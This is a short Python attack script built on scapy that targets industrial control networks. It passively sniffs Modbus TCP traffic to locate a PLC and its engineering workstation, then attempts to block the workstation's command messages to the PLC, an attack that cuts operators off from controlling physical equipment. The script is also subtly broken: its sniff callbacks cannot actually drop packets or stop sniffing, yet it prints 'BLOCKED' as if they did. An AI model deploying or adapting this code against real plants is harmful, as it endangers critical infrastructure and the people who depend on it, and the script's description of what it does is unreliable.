from scapy.all import *
import re

# Define Modbus TCP port
MODBUS_PORT = 502
PLC_IP = None
ENGINEERING_WS_IP = None

def find_plc():
    """ Identify the PLC by analyzing network traffic for Modbus TCP connections. """
    global PLC_IP, ENGINEERING_WS_IP

    def packet_callback(packet):
        global PLC_IP, ENGINEERING_WS_IP
        if packet.haslayer(IP) and packet.haslayer(TCP):
            if packet[TCP].dport == MODBUS_PORT or packet[TCP].sport == MODBUS_PORT:
                # Identify PLC and Engineering workstation
                src_ip = packet[IP].src
                dst_ip = packet[IP].dst

                print(f"[INFO] Possible PLC communication detected: {src_ip} <-> {dst_ip}")

                if packet[TCP].dport == MODBUS_PORT:
                    PLC_IP = dst_ip
                    ENGINEERING_WS_IP = src_ip
                elif packet[TCP].sport == MODBUS_PORT:
                    PLC_IP = src_ip
                    ENGINEERING_WS_IP = dst_ip

                print(f"[INFO] PLC found at {PLC_IP}, Engineering Workstation at {ENGINEERING_WS_IP}")
                return True  # Stop sniffing once found

    print("[INFO] Sniffing network to detect PLC...")
    sniff(filter=f"tcp port {MODBUS_PORT}", prn=packet_callback, timeout=20, store=0)

    if PLC_IP is None or ENGINEERING_WS_IP is None:
        print("[ERROR] Could not detect PLC or Engineering Workstation.")
        exit()

def block_command_messages():
    """ Intercept and drop command messages sent from the Engineering Workstation to the PLC """
    print(f"[INFO] Blocking command messages from {ENGINEERING_WS_IP} to PLC {PLC_IP}")

    def intercept_packet(packet):
        if packet.haslayer(IP) and packet.haslayer(TCP):
            ip_src = packet[IP].src
            ip_dst = packet[IP].dst
            tcp_dport = packet[TCP].dport

            # Identify Modbus TCP command messages going to PLC
            if ip_src == ENGINEERING_WS_IP and ip_dst == PLC_IP and tcp_dport == MODBUS_PORT:
                print(f"[BLOCKED] Command message from {ENGINEERING_WS_IP} to PLC {PLC_IP}")
                return None  # Drop the packet
        return packet  # Forward other packets

    sniff(filter=f"ip src {ENGINEERING_WS_IP} and dst {PLC_IP} and tcp port {MODBUS_PORT}",
          prn=intercept_packet, store=0)

if __name__ == "__main__":
    find_plc()  # Step 1: Detect PLC IP
    block_command_messages()  # Step 2: Block command messages